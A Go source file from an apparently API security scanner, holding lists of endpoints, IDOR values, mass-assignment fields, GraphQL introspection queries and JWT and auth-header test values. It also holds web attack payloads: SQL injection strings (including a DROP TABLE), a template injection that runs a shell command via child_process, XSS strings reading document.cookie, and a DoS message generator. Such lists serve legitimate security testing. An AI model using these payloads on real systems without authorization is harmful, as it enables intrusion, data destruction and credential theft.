// Package payloads provides security testing payloads for API security testing
package payloads

// OpenAPIPaths contains common OpenAPI/Swagger documentation paths
var OpenAPIPaths = []string{
	"/swagger.json",
	"/swagger.yaml",
	"/swagger.yml",
	"/openapi.json",
	"/openapi.yaml",
	"/openapi.yml",
	"/api/docs",
	"/api/documentation",
	"/docs",
	"/documentation",
	"/api/swagger.json",
	"/api/swagger.yaml",
	"/api/openapi.json",
	"/api/openapi.yaml",
	"/v1/swagger.json",
	"/v2/swagger.json",
	"/v3/swagger.json",
	"/api/v1/swagger.json",
	"/api/v2/swagger.json",
	"/swagger-ui.html",
	"/swagger-ui",
	"/api/swagger-ui.html",
	"/redoc",
	"/redoc.html",
	"/api-docs",
	"/api/docs/swagger.json",
	"/.well-known/openapi.json",
	"/.well-known/swagger.json",
}

// CommonAPIEndpoints contains common API endpoint patterns for brute-forcing
var CommonAPIEndpoints = []string{
	// Users
	"/api/v1/users",
	"/api/v2/users",
	"/api/users",
	"/api/v1/user",
	"/api/v2/user",
	"/api/user",
	"/api/v1/users/me",
	"/api/v1/users/1",
	"/api/v1/users/0",
	"/api/v1/users/-1",
	"/api/v1/users/admin",
	"/api/v1/users/guest",

	// Admin
	"/api/v1/admin",
	"/api/v2/admin",
	"/api/admin",
	"/admin/api",
	"/api/v1/admin/users",
	"/api/v1/admin/config",
	"/api/v1/admin/settings",
	"/api/v1/admin/logs",

	// Auth
	"/api/v1/auth",
	"/api/v2/auth",
	"/api/auth",
	"/api/v1/auth/login",
	"/api/v1/auth/register",
	"/api/v1/auth/logout",
	"/api/v1/auth/refresh",
	"/api/v1/auth/forgot-password",
	"/api/v1/auth/reset-password",
	"/api/v1/auth/verify",
	"/api/v1/auth/token",
	"/api/v1/auth/oauth",
	"/api/v1/auth/callback",

	// Configuration
	"/api/v1/config",
	"/api/v2/config",
	"/api/config",
	"/api/v1/configuration",
	"/api/v1/settings",
	"/api/v1/env",
	"/api/v1/environment",

	// Health & Status
	"/health",
	"/healthz",
	"/ready",
	"/readyz",
	"/live",
	"/livez",
	"/status",
	"/api/health",
	"/api/status",
	"/api/ping",

	// Data
	"/api/v1/data",
	"/api/v1/items",
	"/api/v1/products",
	"/api/v1/orders",
	"/api/v1/payments",
	"/api/v1/transactions",
	"/api/v1/invoices",

	// Internal
	"/api/internal",
	"/api/v1/internal",
	"/api/debug",
	"/api/test",
	"/api/beta",

	// GraphQL
	"/graphql",
	"/graphiql",
	"/api/graphql",
	"/api/graphiql",
	"/v1/graphql",
	"/v2/graphql",
	"/query",
	"/api/query",
	"/graphql/v1",
	"/graphql/v2",

	// WebSocket
	"/ws",
	"/websocket",
	"/socket",
	"/api/ws",
	"/api/websocket",
	"/api/socket",
	"/wss",
	"/ws/v1",
	"/ws/v2",

	// Files & Uploads
	"/api/v1/upload",
	"/api/v1/files",
	"/api/v1/file",
	"/api/v1/download",
	"/api/v1/export",
	"/api/v1/import",

	// Search
	"/api/v1/search",
	"/api/search",
	"/api/v1/query",

	// Notifications
	"/api/v1/notifications",
	"/api/v1/messages",
	"/api/v1/events",

	// Misc
	"/api/v1/profile",
	"/api/v1/account",
	"/api/v1/dashboard",
	"/api/v1/reports",
	"/api/v1/analytics",
	"/api/v1/metrics",
	"/api/v1/stats",
}

// IDORTestValues contains test values for IDOR testing
var IDORTestValues = []string{
	"1",
	"2",
	"3",
	"0",
	"-1",
	"999999",
	"0001",
	"00001",
	"true",
	"false",
	"null",
	"me",
	"admin",
	"root",
	"guest",
	"public",
	"private",
	"self",
	"other",
	"all",
	"none",
	"first",
	"last",
	"default",
}

// IDORUUIDPatterns contains common UUID patterns for IDOR testing
var IDORUUIDPatterns = []string{
	"00000000-0000-0000-0000-000000000000",
	"00000000-0000-0000-0000-000000000001",
	"11111111-1111-1111-1111-111111111111",
	"ffffffff-ffff-ffff-ffff-ffffffffffff",
	"aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
	"12345678-1234-1234-1234-123456789012",
}

// MassAssignmentFields contains fields to test for mass assignment vulnerabilities
var MassAssignmentFields = []string{
	"role",
	"roles",
	"admin",
	"isAdmin",
	"is_admin",
	"administrator",
	"isAdministrator",
	"is_administrator",
	"superuser",
	"isSuperuser",
	"is_superuser",
	"staff",
	"isStaff",
	"is_staff",
	"moderator",
	"isModerator",
	"is_moderator",
	"verified",
	"isVerified",
	"is_verified",
	"active",
	"isActive",
	"is_active",
	"enabled",
	"isEnabled",
	"is_enabled",
	"permissions",
	"permission",
	"rights",
	"privileges",
	"access",
	"accessLevel",
	"access_level",
	"level",
	"type",
	"accountType",
	"account_type",
	"userType",
	"user_type",
	"status",
	"state",
	"group",
	"groups",
	"owner",
	"created_by",
	"updated_by",
	"id",
	"uuid",
	"password",
	"password_hash",
	"encrypted_password",
	"api_key",
	"apiKey",
	"apikey",
	"secret",
	"secret_key",
	"secretKey",
	"token",
	"auth_token",
	"authToken",
	"refresh_token",
	"refreshToken",
	"csrf_token",
	"csrfToken",
	"session",
	"session_id",
	"sessionId",
	"credit",
	"credits",
	"balance",
	"amount",
	"price",
	"discount",
	"promo",
	"promo_code",
	"promoCode",
	"subscription",
	"plan",
	"billing",
	"payment",
	"paid",
	"trial",
	"trial_end",
	"trialEnd",
}

// GraphQLIntrospectionQuery is the standard introspection query
var GraphQLIntrospectionQuery = `
query IntrospectionQuery {
  __schema {
    queryType {
      name
      fields {
        name
        type {
          name
          kind
        }
        args {
          name
          type {
            name
            kind
          }
        }
      }
    }
    mutationType {
      name
      fields {
        name
        type {
          name
          kind
        }
        args {
          name
          type {
            name
            kind
          }
        }
      }
    }
    subscriptionType {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}`

// GraphQLFullIntrospectionQuery is a more complete introspection query
var GraphQLFullIntrospectionQuery = `
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}`

// GraphQLTypeNameQuery tests if typename enumeration is possible
var GraphQLTypeNameQuery = `
query {
  __typename
}`

// GraphQLDeepQuery generates a deeply nested query for depth testing
func GraphQLDeepQuery(depth int) string {
	if depth <= 0 {
		return "{ id }"
	}

	query := "{ user {"
	for i := 0; i < depth; i++ {
		query += " friends {"
	}
	query += " id"
	for i := 0; i < depth; i++ {
		query += " }"
	}
	query += " } }"
	return query
}

// GraphQLInjectionPayloads contains payloads for GraphQL injection testing
var GraphQLInjectionPayloads = []string{
	"'",
	"''",
	"'; DROP TABLE users;--",
	"' OR '1'='1",
	"' AND 1=1--",
	"' AND 1=2--",
	"1; SELECT * FROM users",
	"1 UNION SELECT null,null,null",
	"1' UNION SELECT username,password FROM users--",
	"{}",
	"[]",
	"null",
	"undefined",
	"${7*7}",
	"{{7*7}}",
	"<%= 7*7 %>",
	"${process.mainModule.require('child_process').execSync('id').toString()}",
}

// GraphQLBatchQueries contains queries for batch testing
var GraphQLBatchQueries = []string{
	`[{"query": "query { __typename }"}]`,
	`[{"query": "query { __typename }"}, {"query": "query { __typename }"}]`,
	`[{"query": "query { __typename }"}, {"query": "query { __typename }"}, {"query": "query { __typename }"}]`,
}

// WebSocketTestMessages contains test messages for WebSocket testing
var WebSocketTestMessages = []string{
	`{"type": "ping"}`,
	`{"type": "hello"}`,
	`{"action": "subscribe"}`,
	`{"action": "connect"}`,
	`{"event": "message", "data": "test"}`,
	`{"type": "message", "content": "test"}`,
	`{"command": "test"}`,
	`{"cmd": "test"}`,
	`{"op": "test"}`,
	`{"operation": "test"}`,
	`{"method": "GET"}`,
	`{"method": "POST"}`,
	`{"action": "auth"}`,
	`{"action": "login"}`,
	`{"action": "logout"}`,
}

// WebSocketXSSPayloads contains XSS payloads for WebSocket testing
var WebSocketXSSPayloads = []string{
	`<script>alert(1)</script>`,
	`"><img src=x onerror=alert(1)>`,
	`{"message": "<script>alert(1)</script>"}`,
	`{"content": "<img src=x onerror=alert(1)>"}`,
	`{"data": "<svg onload=alert(1)>"}`,
	`<img src=x onerror=alert(document.cookie)>`,
	`<img src=x onerror=alert(document.domain)>`,
}

// WebSocketLargeMessages contains large messages for DoS testing
var WebSocketLargeMessages = []string{
	// Will be generated dynamically based on size requirements
}

// GenerateLargeWebSocketMessage generates a large WebSocket message
func GenerateLargeWebSocketMessage(size int) string {
	msg := `{"type": "message", "data": "`
	msg += makeString("A", size)
	msg += `"}`
	return msg
}

// JWTTestTokens contains test JWT tokens for authentication testing
var JWTTestTokens = []string{
	// alg:none attack
	"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
	// Invalid signature
	"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.invalid_signature",
	// Malformed token
	"malformed.token.here",
	"not.a.jwt",
	"Bearer invalid_token",
	"token123",
	"null",
	"undefined",
	"",
}

// AuthTestHeaders contains headers for authentication testing
var AuthTestHeaders = []string{
	"Authorization",
	"X-Authorization",
	"X-Auth-Token",
	"X-API-Key",
	"X-API-Token",
	"X-Access-Token",
	"API-Key",
	"Authorization-Token",
	"Authentication",
	"X-Auth",
	"Token",
	"Bearer",
}

// MalformedAuthHeaders contains malformed authentication headers
var MalformedAuthHeaders = map[string][]string{
	"Authorization": {
		"Bearer ",
		"Bearer invalid_token_123",
		"Basic ",
		"Token ",
		"Bearer null",
		"Bearer undefined",
	},
	"X-Authorization": {
		"invalid",
		"",
		"null",
	},
	"X-Auth-Token": {
		"",
		"null",
		"undefined",
		"invalid",
	},
	"X-API-Key": {
		"null",
		"undefined",
		"",
		"invalid_key",
	},
	"X-API-Token": {
		"null",
		"undefined",
		"",
		"invalid_token",
	},
}

// MethodOverrideHeaders contains headers for HTTP method override testing
var MethodOverrideHeaders = []string{
	"X-HTTP-Method-Override",
	"X-HTTP-Method",
	"X-Method-Override",
	"_method",
}

// HTTPVerbsForTampering contains HTTP verbs to test for verb tampering
var HTTPVerbsForTampering = []string{
	"GET",
	"POST",
	"PUT",
	"PATCH",
	"DELETE",
	"OPTIONS",
	"HEAD",
	"TRACE",
	"CONNECT",
}

// MalformedJSONBodies contains malformed JSON for error testing
var MalformedJSONBodies = []string{
	`{`,
	`}`,
	`{"}`,
	`{key: value}`,
	`{'key': 'value'}`,
	`{"key": undefined}`,
	`{"key":}`,
	`{:"value"}`,
	`{"key": "value",}`,
	`[`,
	`]`,
	`[1, 2, 3,]`,
	`{key}`,
	`{{}}`,
	`""`,
	`null`,
	`undefined`,
}

// APIContentTypes contains content types to test for API requests
var APIContentTypes = []string{
	"application/json",
	"application/x-www-form-urlencoded",
	"application/xml",
	"text/xml",
	"text/plain",
	"application/graphql",
	"application/json; charset=utf-8",
	"application/vnd.api+json",
}

// makeString creates a string by repeating a character n times
func makeString(char string, n int) string {
	result := make([]byte, n)
	for i := range result {
		result[i] = char[0]
	}
	return string(result)
}
